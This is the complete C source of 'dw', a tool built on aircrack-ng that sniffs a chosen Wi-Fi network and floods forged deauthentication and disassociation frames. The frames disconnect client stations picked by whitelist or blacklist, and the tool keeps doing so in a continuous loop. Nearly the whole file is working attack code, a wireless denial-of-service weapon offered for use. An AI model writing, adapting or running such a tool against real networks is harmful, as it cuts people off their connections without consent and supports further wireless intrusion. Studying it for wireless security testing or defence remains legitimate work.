#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#include "aircrack-ng/src/osdep/osdep.h"

#define uchar unsigned char

#define MAX_PACKET_LENGTH 4096
#define MAC_LENGTH 6
#define MAX_MAC_LIST_ENTRIES 256
#define DESTINATION 'd'
#define SOURCE 's'
#define BSSID 'b'
#define DEFAULT_HOW_MANY_PACKETS_TO_SEND 42
#define VERSION "0.8"
#define VERSION_DATE "Jan 2014"

static struct wif *_wif; // wireless interface
int current_channel = 0;
int with_whitelist = 0; // using whitelist if 1 or blacklist if 0
uchar mac_list[MAX_MAC_LIST_ENTRIES][MAC_LENGTH]; // Whitelist/Blacklist
int mac_list_length = 0;
int verbose = 0;

struct packet
{
    uchar *data;
    int length;
} packet;

int read_packet(uchar *buffer, size_t buffer_size)
{
    int packet_length;

    packet_length = wi_read(_wif, buffer, buffer_size, NULL);

    if (packet_length == -1)
    {
        switch (errno)
        {
        case EAGAIN:
            return 0;
        }

        perror("wi_read()");
        return -1;
    }

    return packet_length;
}

void print_mac(const uchar* mac) {
    int i;

    for (i = 0; i < MAC_LENGTH; i++)
    {
        if (i > 0) printf(":");
        printf("%02X", mac[i]);
    }

    printf("\n");
}

/* FIXME: should be refactored */
void print_packet(uchar *h80211, int buffer_size)
{
    int i, j;

    printf("        Size: %d, FromDS: %d, ToDS: %d", buffer_size, (h80211[1] & 2) >> 1, (h80211[1] & 1));

    if ((h80211[0] & 0x0C) == 8 && (h80211[1] & 0x40) != 0)
    {
        if ((h80211[27] & 0x20) == 0)
            printf(" (WEP)");
        else
            printf(" (WPA)");
    }

    for (i = 0; i < buffer_size; i++)
    {
        if ((i & 15) == 0)
        {
            if (i == 224)
            {
                printf("\n        --- CUT ---");
                break;
            }

            printf("\n        0x%04x:  ", i);
        }

        printf("%02x", h80211[i]);

        if ((i & 1) != 0)
            printf(" ");

        if (i == buffer_size - 1 && ((i + 1) & 15) != 0)
        {
            for (j = ((i + 1) & 15); j < 16; j++)
            {
                printf("  ");
                if ((j & 1) != 0)
                    printf(" ");
            }

            printf(" ");

            for (j = 16 - ((i + 1) & 15); j < 16; j++)
            {
                printf(
                    "%c",
                    (h80211[i - 15 + j] <  32 || h80211[i - 15 + j] > 126) ?
                        '.' : h80211[i - 15 + j]
                );
            }
        }

        if (i > 0 && ((i + 1) & 15) == 0)
        {
            printf(" ");

            for (j = 0; j < 16; j++)
            {
                printf(
                    "%c",
                    (h80211[i - 15 + j] <  32 || h80211[i - 15 + j] > 127) ?
                        '.' : h80211[i - 15 + j]
                );
            }
        }
    }

    printf("\n");
}

struct packet create_deauth_frame(uchar *mac_destination, uchar *mac_source, uchar *mac_bssid, int is_disassociation)
{
    // Generating deauthentication or disassociation frame
    // with unspecified reason.
    struct packet result_packet;
    uchar packet_data[MAX_PACKET_LENGTH];
                                     //Destination           //Source
    char *header =  "\xc0\x00\x3a\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                    //BSSID                  //SEQ //REASON
                    "\x00\x00\x00\x00\x00\x00\x70\x6a\x01\x00";

    memcpy(packet_data, header, 25);
    if (is_disassociation)
    {
        packet_data[0] = '\xa0';
    }
    // Set target Dest, Src, BSSID
    memcpy(packet_data + 4, mac_destination, MAC_LENGTH);
    memcpy(packet_data + 10, mac_source, MAC_LENGTH);
    memcpy(packet_data + 16, mac_bssid, MAC_LENGTH);

    result_packet.length = 26;
    result_packet.data = packet_data;

    if (verbose)
    {
        printf("\n----- create_deauth_frame -----\n");
        printf("is_disassociation_frame: %d\n", is_disassociation);
        printf("destination: ");
        print_mac(mac_destination);
        printf("source: ");
        print_mac(mac_source);
        printf("bssid: ");
        print_mac(mac_bssid);
        printf("-------------------------------\n");
    }
    return result_packet;
}

int send_packet(uchar *buf, size_t count)
{
    uchar* to_send = malloc(count);
    memcpy(to_send, buf, count);

    if (wi_write(_wif, to_send, count, NULL) == -1) {
        switch (errno) {
        case EAGAIN:
        case ENOBUFS:
            usleep(10000);

            free(to_send);

            return 0;
        }
        perror("wi_write()");

        free(to_send);
        return -1;
    }

    free(to_send);
    return 0;
}


//Returns pointer to the desired MAC Adresses inside a packet
uchar *get_mac_from_packet(char type, uchar *packet)
{
    switch (type)
    {
    case DESTINATION:
        return packet + 4;
    case SOURCE:
        return packet + 10;
    case BSSID:
        return packet + 16;
    }

    return NULL;
}

// Convert hexadecimal input into a byte
char hex_to_char(char byte1, char byte2)
{
    char result;

    if (byte1 == '0') { result = 0; }
    if (byte1 == '1') { result = 16; }
    if (byte1 == '2') { result = 32; }
    if (byte1 == '3') { result = 48; }
    if (byte1 == '4') { result = 64; }
    if (byte1 == '5') { result = 80; }
    if (byte1 == '6') { result = 96; }
    if (byte1 == '7') { result = 112; }
    if (byte1 == '8') { result = 128; }
    if (byte1 == '9') { result = 144; }
    if (byte1 == 'A' || byte1 == 'a') { result = 160; }
    if (byte1 == 'B' || byte1 == 'b') { result = 176; }
    if (byte1 == 'C' || byte1 == 'c') { result = 192; }
    if (byte1 == 'D' || byte1 == 'd') { result = 208; }
    if (byte1 == 'E' || byte1 == 'e') { result = 224; }
    if (byte1 == 'F' || byte1 == 'f') { result = 240; }

    if (byte2 == '0') { result += 0; }
    if (byte2 == '1') { result += 1; }
    if (byte2 == '2') { result += 2; }
    if (byte2 == '3') { result += 3; }
    if (byte2 == '4') { result += 4; }
    if (byte2 == '5') { result += 5; }
    if (byte2 == '6') { result += 6; }
    if (byte2 == '7') { result += 7; }
    if (byte2 == '8') { result += 8; }
    if (byte2 == '9') { result += 9; }
    if (byte2 == 'A' || byte2 == 'a') { result += 10; }
    if (byte2 == 'B' || byte2 == 'b') { result += 11; }
    if (byte2 == 'C' || byte2 == 'c') { result += 12; }
    if (byte2 == 'D' || byte2 == 'd') { result += 13; }
    if (byte2 == 'E' || byte2 == 'e') { result += 14; }
    if (byte2 == 'F' || byte2 == 'f') { result += 15; }

    return result;
}

// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB
uchar *parse_mac(const uchar *input)
{
    uchar tmp[12] = "000000000000";
    uchar *mac_parsed = malloc(MAC_LENGTH);
    int t;

    if (input[2] == ':')
    {
        memcpy(tmp, input, 2);
        memcpy(tmp + 2, input + 3, 2);
        memcpy(tmp + 4, input + 6, 2);
        memcpy(tmp + 6, input + 9, 2);
        memcpy(tmp + 8, input + 12, 2);
        memcpy(tmp + 10, input + 15, 2);
    }
    else
    {
        memcpy(tmp, input, 12);
    }

    for (t = 0; t < MAC_LENGTH; t++)
    {
        mac_parsed[t] = hex_to_char(tmp[2*t], tmp[2*t+1]);
    }

    return mac_parsed;
}

void set_channel(int channel)
{
    if (verbose)
    {
        printf("Setting channel to %d", channel);
    }

    wi_set_channel(_wif, channel);
    current_channel = channel;
}

int get_channel()
{
    return current_channel;
}

// Read mac from file
// New line removed
uchar *read_mac_from_file(FILE *file)
{
    int max_length = 255;
    int length = 32;
    char *line = NULL;
    char *mac = NULL;
    size_t allocated = 0;
    int line_length = 0;

    line_length = getline(&line, &allocated, file);
    if (line_length == -1)
    {
        return NULL;
    }

    if (line_length > max_length)
    {
        mac = malloc(max_length + 1);
        memcpy(mac, line, max_length);
        mac[max_length + 1] = '\x00';
        length = strlen((const char*) mac);
    }
    else
    {
        mac = malloc(length);
        memcpy(mac, line, length);
    }

    free(line);
    mac[length - 1] = '\x00';

    return (uchar *) mac;
}

void load_list_file(const char *filename)
{
    FILE *file;                     // File containing MACs list
    uchar *mac;
    uchar *raw_mac;
    mac_list_length = 0;

    /* open file for input */
    if ((file = fopen(filename, "r")) == NULL)
    {
        printf("Cannot open file \n");
        exit(1);
    }

    while ((raw_mac = read_mac_from_file(file)))
    {
        mac = parse_mac(raw_mac);
        memcpy(mac_list[mac_list_length], mac, MAC_LENGTH);
        mac_list_length++;

        free(raw_mac);
        free(mac);

        if ((unsigned int) mac_list_length >= sizeof (mac_list) / sizeof (mac_list[0]))
        {
            fprintf(stderr, "Exceeded max with_whitelist entries\n");
            exit(1);
        }
    }

    fclose(file);
}

int is_in_list(uchar *mac)
{
    int t;

    for (t = 0; t < mac_list_length; t++)
    {
        if (!memcmp(mac_list[t], mac, MAC_LENGTH))
            return 1;
    }

    return 0;
}

int is_target_mac(uchar *mac)
{
    return with_whitelist ? !is_in_list(mac) : is_in_list(mac);
}

/* Sniffing Functions */
uchar *get_target(uchar *bssid)
{
    uchar *sniffed_packet_data = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
    uchar *fetched_bssid = NULL;
    uchar *source = NULL;

    // Sniffing for data frames to find targets
    int packet_length = 0;
    while (1)
    {
        packet_length = 0;

        do {
            packet_length = read_packet(sniffed_packet_data, MAX_PACKET_LENGTH);

            if (packet_length >= 22) {
                fetched_bssid = get_mac_from_packet(BSSID, sniffed_packet_data);
                source = get_mac_from_packet(SOURCE, sniffed_packet_data);
            }
        } while(
            packet_length < 22 ||
            memcmp(bssid, fetched_bssid, MAC_LENGTH) ||
            !memcmp(source, fetched_bssid, MAC_LENGTH) ||
            !is_target_mac(source)
        );

        return sniffed_packet_data;
    }
}

void deauthenticate_station(uchar *bssid, uchar *station, int how_many)
{
    int counter = 0;
    struct packet result_packet = create_deauth_frame(station, bssid, bssid, 1);

    if (verbose)
    {
        printf("Disassociate router -> station: \n");
        print_packet(result_packet.data, result_packet.length);
    }

    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);

    if (verbose) printf("%d packets send\n\n", how_many);

    result_packet = create_deauth_frame(station, bssid, bssid, 0);

    if (verbose)
    {
        printf("Deauthenticate router -> station: \n");
        print_packet(result_packet.data, result_packet.length);
    }

    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);

    if (verbose) printf("%d packets send\n\n", how_many);

    result_packet = create_deauth_frame(bssid, station, bssid, 1);

    if (verbose)
    {
        printf("Disassociate station -> router: \n");
        print_packet(result_packet.data, result_packet.length);
    }

    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);

    if (verbose) printf("%d packets send\n\n", how_many);

    result_packet = create_deauth_frame(bssid, station, bssid, 0);

    if (verbose)
    {
        printf("Deauthenticate station -> router: \n");
        print_packet(result_packet.data, result_packet.length);
    }

    for (counter = 0; counter < how_many; counter++)
        send_packet(result_packet.data, result_packet.length);

    if (verbose) printf("%d packets send\n\n    ", how_many);
}

void print_help()
{
    printf(
        "dw " VERSION " Disconnect clients from a Wireless network. \n"
        "Usage:                                                     \n"
        "dw <interface> <bssid> <-w|-b> <filename> [options]        \n"
        "   Specify at least one of -w or -b options                \n"
        "Options:                                                   \n"
        " -w <filena>       Whitelist with clients that should      \n"
        "                   NOT be deauthenticated.                 \n"
        " -b <filename>     Blacklist with clients that should      \n"
        "                   deauthenticated.                        \n"
        " -c <channel>      Channel - specify this only if you      \n"
        "                   are not currently connected to the      \n"
        "                   network.                                \n"
        " -p <num>          How many packets to send.               \n"
        "                   Default 42.                             \n"
        " -v, --verbose     Verbose output.                         \n"
        " -h, --help        Will print this text and exit.          \n"
        " -V, --version     Print version and exit.                 \n"
    );
}

void print_version()
{
    printf("dw " VERSION " - " VERSION_DATE "\n");
}

int main(int argc, const char *argv[])
{
    uchar *bssid;
    int channel = 0, t, how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
    const char *list_file = NULL;

    if (geteuid() != 0)
    {
        printf("This program requires root privileges.\n");
        return 1;
    }

    if (argc > 1 && (!strcmp(argv[1], "-V") || !strcmp(argv[1], "--version")))
    {
        print_version();
        return 0;
    }
    else if (argc < 3 || !memcmp(argv[1], "--help", 6) || !memcmp(argv[1], "-h", 2))
    {
        print_help();
        return 0;
    }

    bssid = parse_mac((const uchar*) argv[2]);

    for (t = 3; t < argc; t++)
    {
        if (!strcmp(argv[t], "-w") && argc >= t+1)
        {
            with_whitelist = 1;
            list_file = argv[++t];
            load_list_file(list_file);
        }
        else if (!strcmp(argv[t], "-b") && argc >= t+1)
        {
            with_whitelist = 2;
            list_file = argv[++t];
            load_list_file(list_file);
        }
        else if (!strcmp(argv[t], "-c") && argc >= t+1)
        {
            channel = atoi(argv[++t]);
            if (channel > 0 && channel < 15)
            {
                set_channel(channel);
            }
            else
            {
                print_help();
                return 1;
            }
        }
        else if (!strcmp(argv[t], "-p") && argc >= t+1)
        {
            how_many = atoi(argv[++t]);
            if (how_many < 2 || how_many > 256)
            {
                printf("\nNumber of packets shoul be between 2 and 256.\n");
                how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
            }
        }
        else if (!strcmp(argv[t], "-h") || !strcmp(argv[t], "--help"))
        {
            print_help();
            return 0;
        }
        else if (!strcmp(argv[t], "-v") || !strcmp(argv[t], "--verbose"))
        {
            verbose = 1;
        }
        else if (!strcmp(argv[t], "-V") || !strcmp(argv[t], "--version"))
        {
            print_version();
            return 0;
        }
        else
        {
            printf("\nUnknown option %s \n", argv[t]);
            print_help();
            return 1;
        }
    }

    if (with_whitelist)
    {
        if (with_whitelist == 2) {
            with_whitelist = 0;
        }
    }
    else
    {
        print_help();
        return 1;
    }

    /* open the replay interface */
    _wif = wi_open((char*) argv[1]);
    if (!_wif)
        return 1;

    /* drop privileges */
    setuid(getuid());

    if (verbose)
    {
        printf("---- Loaded list ----\n");
        printf("Type: ");

        if (with_whitelist)
            printf("whitelist.\n");
        else
            printf("blacklist.\n");

        printf("MACs:\n");
        int i = 0;
        for (i = 0; i < mac_list_length; i++)
        {
            print_mac(mac_list[i]);
        }

        printf("---------------------\n");
    }

    while (1)
    {
        uchar *target_packet = get_target(bssid);
        uchar *station = get_mac_from_packet(SOURCE, target_packet);

        if (verbose) {
            printf("\n\n================[NEW PACKET OF INTEREST CAPTURED]================\n\n");
            printf("Expected BSSID: ");
            print_mac(bssid);
            printf("\n---- Frame ----\n");
            printf("Station: ");
            print_mac(station);

            if  (with_whitelist)
            {
                printf("The station mac is not in the whitelist.\n");
            }
            else
            {
                printf("The station mac is in the blacklist.\n");
            }

            printf("The captured packet itself: \n");
            print_packet(target_packet, MAX_PACKET_LENGTH);
        }

        deauthenticate_station(bssid, station, how_many);

        free(target_packet);
    }

    free(bssid);

    return 0;
}
